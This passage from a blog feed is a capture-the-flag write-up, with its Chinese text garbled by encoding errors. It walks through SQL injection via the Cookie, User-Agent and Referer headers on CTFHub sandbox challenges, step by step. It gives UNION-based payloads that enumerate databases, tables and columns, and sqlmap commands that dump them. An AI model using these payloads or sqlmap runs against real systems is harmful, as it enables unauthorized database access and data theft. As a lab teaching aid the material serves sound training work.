src="https://img-blog.csdnimg.cn/20210127144717532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>burpsuiteæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°Cookieé‡Œé¢æœ‰idå‚æ•°<br><img src="https://img-blog.csdnimg.cn/20210127144902149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.åˆ¤æ–­æ³¨å…¥ç±»å‹<br><code>id=1 and 1=1</code>æœ‰å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/20210127145409657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>id=1 and 1=2</code>æ— å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/20210127145335993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>2.åˆ¤æ–­å­—æ®µæ•°<br>å½“<code>id=1 order by 2</code> æ—¶å›æ˜¾æ­£å¸¸ï¼Œå½“<code>id=1 order by 3</code>æ—¶æ— å›æ˜¾ï¼Œæ‰€ä»¥å­—æ®µæ•°ä¸º2<br><img src="https://img-blog.csdnimg.cn/20210127145658543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3.çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>å½“å‰æ•°æ®åº“åä¸ºsqli<br><img src="https://img-blog.csdnimg.cn/20210127145752840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4.çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªè¡¨ï¼Œusrnjffgtaå’Œnews<br><img src="https://img-blog.csdnimg.cn/20210127145910479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>5.çˆ†å­—æ®µå</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;usrnjffgta&#x27;</span><br></code></pre></td></tr></table></figure><p>å­—æ®µåä¸ºwbloxpuwcu<br><img src="https://img-blog.csdnimg.cn/20210127150117665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>6.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(wbloxpuwcu) <span class="hljs-keyword">from</span> usrnjffgta<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150238553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>sqlmapâ€“Cookieæ³¨å…¥</strong></p><blockquote><p>åœ¨sqlmapä¸­ä½¿ç”¨cookieæ³¨å…¥ï¼Œlevel &gt;=2æ‰è¡Œ</p></blockquote><p>é¦–å…ˆæ£€æµ‹æ˜¯å¦æœ‰cookieæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2  </span><br></code></pre></td></tr></table></figure><p>å­˜åœ¨Cookieæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/20210127151950563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨kalié‡Œé¢çš„sqlmapå·¥å…·<br>1.æŸ¥åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 --dbs   </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150746902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2.æŸ¥è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012715085841.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3.æŸ¥å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151427189.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta -C wbloxpuwcu --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151344509.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="UAæ³¨å…¥"><a href="#UAæ³¨å…¥" class="headerlink" title="UAæ³¨å…¥"></a>UAæ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210127152415405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æç¤ºè¾“å…¥ç‚¹åœ¨User-Agentï¼Œä½¿ç”¨bpæŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/20210127152708187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.åˆ¤æ–­æ³¨å…¥ç±»å‹<br>è¾“å…¥1ï¼Œæœ‰å›æ˜¾ï¼›è¾“å…¥1 and 1=1ï¼Œæ­£å¸¸å›æ˜¾ï¼›è¾“å…¥1 and 1=2,  è¿”å›é”™è¯¯ã€‚<br><img src="https://img-blog.csdnimg.cn/20210127152937575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨å…¥ç±»å‹ä¸ºæ•°å­—å‹æ³¨å…¥</p><p>2.åˆ¤æ–­å­—æ®µæ•°<br>å½“<code>1 order by 2</code> æ—¶ï¼Œå›æ˜¾æ­£å¸¸ï¼Œå½“<code>1 order by 3</code>æ—¶ï¼Œæ— å›æ˜¾ï¼Œæ‰€ä»¥å­—æ®µæ•°ä¸º2<br><img src="https://img-blog.csdnimg.cn/20210127153140753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3.çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>å½“å‰æ•°æ®åº“åä¸ºsqli<br><img src="https://img-blog.csdnimg.cn/20210127153316846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4.çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªè¡¨ï¼Œ news,llvyiyrndd<br><img src="https://img-blog.csdnimg.cn/20210127153357173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>5.çˆ†å­—æ®µå</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;llvyiyrndd&#x27;</span><br></code></pre></td></tr></table></figure><p>å­—æ®µåä¸ºmgrbaiuvpa<br><img src="https://img-blog.csdnimg.cn/20210127153448891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>6.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(mgrbaiuvpa) <span class="hljs-keyword">from</span> llvyiyrndd<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127153551534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>sqlmapâ€“UAæ³¨å…¥</strong></p><blockquote><p>åœ¨sqlmapä¸­lever&gt;=3æ‰ä¼šå»æ£€æŸ¥user-agentå¤´æ˜¯å¦å­˜åœ¨æ³¨å…¥æ¼æ´</p></blockquote><p>é¦–å…ˆæ£€æµ‹æ˜¯å¦æœ‰UAæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-532573947dea4d7b.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>user-agentå¤„å­˜åœ¨æ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/20210127160432116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.çˆ†æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3  --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154207704.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2.çˆ†è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154647309.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3.çˆ†å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155148329.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd -C mgrbaiuvpa --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155209659.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Referæ³¨å…¥"><a href="#Referæ³¨å…¥" class="headerlink" title="Referæ³¨å…¥"></a>Referæ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210127161950997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æç¤ºè¯·åœ¨refererè¾“å…¥IDï¼ŒbpæŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/20210127162149802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¡¥å……Refererå¤´<br><img src="https://img-blog.csdnimg.cn/20210127162227937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>å½“å‰æ•°æ®åº“åä¸ºsqli<br><img src="https://img-blog.csdnimg.cn/20210127162404134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2.çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªè¡¨ï¼Œ news,scghlrqxyi<br><img src="https://img-blog.csdnimg.cn/20210127162506792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3.çˆ†å­—æ®µå</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;scghlrqxyi&#x27;</span><br></code></pre></td></tr></table></figure><p>å­—æ®µåä¸ºvzbmlruwwt<br><img src="https://img-blog.csdnimg.cn/20210127162548886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>4.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(vzbmlruwwt) <span class="hljs-keyword">from</span> scghlrqxyi<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127162635557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>sqlmapâ€“Referæ³¨å…¥</strong></p><blockquote><p>ä¼ªé€ httpè¯·æ±‚ä¸­çš„refererï¼Œlevel&gt;=3æ—¶ï¼Œsqlmapå°è¯•refereræ³¨å…¥</p></blockquote><p>é¦–å…ˆæ£€æµ‹æ˜¯å¦æœ‰Referæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>Refererå¤´å­˜åœ¨æ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/20210127164244547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>1.çˆ†æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164340575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>2.çˆ†è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164517402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3.çˆ†å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164603239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>4.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi -C vzbmlruwwt --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164810825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>SQLæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹å¼±ç±»å‹ç»•è¿‡</title>
    <link href="/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
